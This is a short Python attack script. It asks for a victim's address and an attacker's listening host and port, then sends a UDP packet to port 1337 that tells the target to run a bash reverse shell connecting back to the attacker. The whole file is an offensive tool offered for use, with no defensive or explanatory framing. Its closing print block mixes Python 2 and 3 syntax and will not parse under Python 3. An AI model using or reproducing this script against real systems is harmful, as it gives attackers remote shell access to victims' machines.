import socket

bad_udp_port = 1337

bad_udp_packet = "runcmd /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'"

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

try:
    input = raw_input
except NameError:
    pass

victim = input('Enter victim\'s IP/hostname: ')
ip = input('Enter your listening IP/hostname: ')
port = input('Enter your listening port: ')
s.sendto((bad_udp_packet % (ip,port)).encode(),(victim,bad_udp_port))

try:
    print("Sending reverse TCP shell")
except:
    print "Sending reverse TCP shell";
